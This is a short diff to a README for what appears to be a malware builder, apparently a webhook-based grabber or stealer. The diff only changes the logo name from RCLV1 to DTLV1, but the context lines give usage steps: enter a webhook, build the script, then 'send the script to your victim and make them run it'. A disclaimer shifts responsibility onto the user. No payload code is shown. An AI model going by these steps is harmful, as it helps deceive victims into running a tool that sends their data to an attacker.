@@ -42,7 +42,7 @@ By using **THIS SCRIPT**, you agree that you **hold responsibility** and account
 
 # How to use
 ```python
- - Run main.py and wait until the logo pops up it should say RCLV1
+ - Run main.py and wait until the logo pops up it should say DTLV1
  - Enter webhook
  - Click enter and wait
  - Then send the script to your victim and make them run it!
